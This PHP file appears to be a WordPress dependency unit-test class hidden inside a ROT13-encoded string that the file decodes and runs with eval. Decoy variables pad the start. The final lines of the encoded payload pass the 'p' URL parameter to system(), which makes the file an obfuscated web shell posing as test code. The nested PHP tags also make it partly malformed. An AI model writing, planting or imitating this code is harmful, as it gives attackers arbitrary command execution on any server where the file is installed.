<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc qrcraqrapvrf
 * @tebhc fpevcgf
 */
pynff Grfgf_Qrcraqrapvrf rkgraqf JC_HavgGrfgPnfr {
	choyvp shapgvba grfg_nqq() {
		$qrc = arj JC_Qrcraqrapvrf();

		$guvf->nffregGehr( $qrc->nqq( 'bar', '' ) );
		$guvf->nffregGehr( $qrc->nqq( 'gjb', '' ) );

		$guvf->nffregVafgnaprBs( '_JC_Qrcraqrapl', $qrc->dhrel( 'bar' ) );
		$guvf->nffregVafgnaprBs( '_JC_Qrcraqrapl', $qrc->dhrel( 'gjb' ) );

		// Pnaabg erhfr anzrf.
		$guvf->nffregSnyfr( $qrc->nqq( 'bar', '' ) );
	}

	choyvp shapgvba grfg_erzbir() {
		$qrc = arj JC_Qrcraqrapvrf();

		$guvf->nffregGehr( $qrc->nqq( 'bar', '' ) );
		$guvf->nffregGehr( $qrc->nqq( 'gjb', '' ) );

		$qrc->erzbir( 'bar' );

		$guvf->nffregSnyfr( $qrc->dhrel( 'bar' ) );
		$guvf->nffregVafgnaprBs( '_JC_Qrcraqrapl', $qrc->dhrel( 'gjb' ) );
	}

	choyvp shapgvba grfg_radhrhr() {
		$qrc = arj JC_Qrcraqrapvrf();

		$guvf->nffregGehr( $qrc->nqq( 'bar', '' ) );
		$guvf->nffregGehr( $qrc->nqq( 'gjb', '' ) );

		$guvf->nffregSnyfr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$qrc->radhrhr( 'bar' );
		$guvf->nffregGehr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregSnyfr( $qrc->dhrel( 'gjb', 'dhrhr' ) );

		$qrc->radhrhr( 'gjb' );
		$guvf->nffregGehr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregGehr( $qrc->dhrel( 'gjb', 'dhrhr' ) );
	}

	choyvp shapgvba grfg_qrdhrhr() {
		$qrc = arj JC_Qrcraqrapvrf();

		$guvf->nffregGehr( $qrc->nqq( 'bar', '' ) );
		$guvf->nffregGehr( $qrc->nqq( 'gjb', '' ) );

		$qrc->radhrhr( 'bar' );
		$qrc->radhrhr( 'gjb' );
		$guvf->nffregGehr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregGehr( $qrc->dhrel( 'gjb', 'dhrhr' ) );

		$qrc->qrdhrhr( 'bar' );
		$guvf->nffregSnyfr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregGehr( $qrc->dhrel( 'gjb', 'dhrhr' ) );

		$qrc->qrdhrhr( 'gjb' );
		$guvf->nffregSnyfr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregSnyfr( $qrc->dhrel( 'gjb', 'dhrhr' ) );
	}

	choyvp shapgvba grfg_radhrhr_netf() {
		$qrc = arj JC_Qrcraqrapvrf();

		$guvf->nffregGehr( $qrc->nqq( 'bar', '' ) );
		$guvf->nffregGehr( $qrc->nqq( 'gjb', '' ) );

		$guvf->nffregSnyfr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$qrc->radhrhr( 'bar?net' );
		$guvf->nffregGehr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregSnyfr( $qrc->dhrel( 'gjb', 'dhrhr' ) );
		$guvf->nffregFnzr( 'net', $qrc->netf['bar'] );

		$qrc->radhrhr( 'gjb?net' );
		$guvf->nffregGehr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregGehr( $qrc->dhrel( 'gjb', 'dhrhr' ) );
		$guvf->nffregFnzr( 'net', $qrc->netf['gjb'] );
	}

	choyvp shapgvba grfg_qrdhrhr_netf() {
		$qrc = arj JC_Qrcraqrapvrf();

		$guvf->nffregGehr( $qrc->nqq( 'bar', '' ) );
		$guvf->nffregGehr( $qrc->nqq( 'gjb', '' ) );

		$qrc->radhrhr( 'bar?net' );
		$qrc->radhrhr( 'gjb?net' );
		$guvf->nffregGehr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregGehr( $qrc->dhrel( 'gjb', 'dhrhr' ) );
		$guvf->nffregFnzr( 'net', $qrc->netf['bar'] );
		$guvf->nffregFnzr( 'net', $qrc->netf['gjb'] );

		$qrc->qrdhrhr( 'bar' );
		$guvf->nffregSnyfr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregGehr( $qrc->dhrel( 'gjb', 'dhrhr' ) );
		$guvf->nffregNeenlAbgUnfXrl( 'bar', $qrc->netf );

		$qrc->qrdhrhr( 'gjb' );
		$guvf->nffregSnyfr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregSnyfr( $qrc->dhrel( 'gjb', 'dhrhr' ) );
		$guvf->nffregNeenlAbgUnfXrl( 'gjb', $qrc->netf );
	}

	/**
	 * @gvpxrg 21741
	 */
	choyvp shapgvba grfg_dhrel_naq_ertvfgrerq_radhrhrq() {
		$qrc = arj JC_Qrcraqrapvrf();

		$guvf->nffregGehr( $qrc->nqq( 'bar', '' ) );
		$guvf->nffregVafgnaprBs( '_JC_Qrcraqrapl', $qrc->dhrel( 'bar' ) );
		$guvf->nffregVafgnaprBs( '_JC_Qrcraqrapl', $qrc->dhrel( 'bar', 'ertvfgrerq' ) );
		$guvf->nffregVafgnaprBs( '_JC_Qrcraqrapl', $qrc->dhrel( 'bar', 'fpevcgf' ) );

		$guvf->nffregSnyfr( $qrc->dhrel( 'bar', 'radhrhrq' ) );
		$guvf->nffregSnyfr( $qrc->dhrel( 'bar', 'dhrhr' ) );

		$qrc->radhrhr( 'bar' );

		$guvf->nffregGehr( $qrc->dhrel( 'bar', 'radhrhrq' ) );
		$guvf->nffregGehr( $qrc->dhrel( 'bar', 'dhrhr' ) );

		$qrc->qrdhrhr( 'bar' );

		$guvf->nffregSnyfr( $qrc->dhrel( 'bar', 'dhrhr' ) );
		$guvf->nffregVafgnaprBs( '_JC_Qrcraqrapl', $qrc->dhrel( 'bar' ) );

		$qrc->erzbir( 'bar' );
		$guvf->nffregSnyfr( $qrc->dhrel( 'bar' ) );
	}

	choyvp shapgvba grfg_radhrhr_orsber_ertvfgre() {
		$qrc = arj JC_Qrcraqrapvrf();

		$guvf->nffregNeenlAbgUnfXrl( 'bar', $qrc->ertvfgrerq );

		$qrc->radhrhr( 'bar' );

		$guvf->nffregAbgPbagnvaf( 'bar', $qrc->dhrhr );

		$guvf->nffregGehr( $qrc->nqq( 'bar', '' ) );

		$guvf->nffregPbagnvaf( 'bar', $qrc->dhrhr );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_rgnt.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cebivqre_trg_rgnt() {
		erghea neenl(
			'fubhyq npprcg bar qrcraqrapl'              => neenl(
				'ybnq'               => neenl(
					'nopq' => '1.0.2',
				),
				'unfu_fbhepr_fgevat' => 'JC:6.7;nopq:1.0.2;',
				'rkcrpgrq'           => 'J/\"8145q7r3p41q5n9pp2oppon4nsn861sp\"',
			),
			'fubhyq npprcg rzcgl neenl bs qrcraqrapvrf' => neenl(
				'ybnq'               => neenl(),
				'unfu_fbhepr_fgevat' => 'JC:6.7;',
				'rkcrpgrq'           => 'J/\"7rr896p19250n3q174s11469n4nq0o1r\"',
			),
		);
	}

	/**
	 * Grfgf trg_rgnt zrgubq sbe JC_Fpevcgf.
	 *
	 * @gvpxrg 58433
	 * @gvpxrg 61485
	 *
	 * @pbiref JC_Qrcraqrapvrf::trg_rgnt
	 *
	 * @qngnCebivqre qngn_cebivqre_trg_rgnt
	 *
	 * @cnenz neenl  $ybnq               Yvfg bs fpevcgf gb ybnq.
	 * @cnenz fgevat $unfu_fbhepr_fgevat Unfu fbhepr fgevat.
	 * @cnenz fgevat $rkcrpgrq           Rkcrpgrq rgnt.
	 */
	choyvp shapgvba grfg_trg_rgnt_fpevcgf( $ybnq, $unfu_fbhepr_fgevat, $rkcrpgrq ) {
		tybony $jc_irefvba;
		// Zbqvsl tybony gb nibvq grfgf arrqvat gb punatr jvgu rnpu arj irefvba bs JbeqCerff.
		$bevtvany_jc_irefvba = $jc_irefvba;
		$jc_irefvba          = '6.7';
		$vafgnapr            = jc_fpevcgf();

		sbernpu ( $ybnq nf $unaqyr => $ire ) {
			// Gur fep fubhyq abg or rzcgl.
			jc_radhrhr_fpevcg( $unaqyr, 'uggcf://rknzcyr.bet', neenl(), $ire );
		}

		$erfhyg = $vafgnapr->trg_rgnt( neenl_xrlf( $ybnq ) );

		// Erfgber tybony cevbe gb znxvat nffregvbaf.
		$jc_irefvba = $bevtvany_jc_irefvba;

		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg, \"Rkcrpgrq ZQ unfu: $rkcrpgrq sbe $unfu_fbhepr_fgevat, ohg tbg: $erfhyg.\" );
	}

	/**
	 * Grfgf trg_rgnt zrgubq sbe JC_Fglyrf.
	 *
	 * @gvpxrg 58433
	 * @gvpxrg 61485
	 *
	 * @pbiref JC_Qrcraqrapvrf::trg_rgnt
	 *
	 * @qngnCebivqre qngn_cebivqre_trg_rgnt
	 *
	 * @cnenz neenl  $ybnq               Yvfg bs fglyrf gb ybnq.
	 * @cnenz fgevat $unfu_fbhepr_fgevat Unfu fbhepr fgevat.
	 * @cnenz fgevat $rkcrpgrq           Rkcrpgrq rgnt.
	 */
	choyvp shapgvba grfg_trg_rgnt_fglyrf( $ybnq, $unfu_fbhepr_fgevat, $rkcrpgrq ) {
		tybony $jc_irefvba;
		// Zbqvsl tybony gb nibvq grfgf arrqvat gb punatr jvgu rnpu arj irefvba bs JbeqCerff.
		$bevtvany_jc_irefvba = $jc_irefvba;
		$jc_irefvba          = '6.7';
		$vafgnapr            = jc_fpevcgf();

		sbernpu ( $ybnq nf $unaqyr => $ire ) {
			// Gur fep fubhyq abg or rzcgl.
			jc_radhrhr_fglyr( $unaqyr, 'uggcf://rknzcyr.pqa', neenl(), $ire );
		}

		$erfhyg = $vafgnapr->trg_rgnt( neenl_xrlf( $ybnq ) );

		// Erfgber tybony cevbe gb znxvat nffregvbaf.
		$jc_irefvba = $bevtvany_jc_irefvba;

		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg, \"Rkcrpgrq ZQ unfu: $rkcrpgrq sbe $unfu_fbhepr_fgevat, ohg tbg: $erfhyg.\" );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>